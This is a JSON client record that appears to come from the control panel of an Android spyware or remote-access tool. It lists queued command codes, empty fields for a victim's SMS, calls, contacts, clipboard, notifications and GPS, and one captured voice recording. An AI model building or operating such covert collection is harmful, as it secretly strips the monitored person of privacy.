{
  "clientID": "aa515ee1-af3e-4fd5-ac82-4a01bbe48032",
  "CommandQue": [
    {
      "type": "0xCO",
      "uid": 7917
    },
    {
      "action": "ls",
      "type": "0xSM",
      "uid": 5942
    },
    {
      "type": "0xWI",
      "uid": 735
    }
  ],
  "SMSData": [],
  "CallData": [],
  "contacts": [],
  "wifiNow": [],
  "wifiLog": [],
  "clipboardLog": [],
  "notificationLog": [],
  "enabledPermissions": [],
  "apps": [],
  "GPSData": [],
  "GPSSettings": {
    "updateFrequency": 0
  },
  "downloads": [
    {
      "time": "2024-08-17T14:30:57.957Z",
      "type": "voiceRecord",
      "originalName": "sound7365204725685486602.mp3",
      "path": "/client_downloads/6e2a7-9c79-3b83c.mp3"
    }
  ],
  "currentFolder": []
}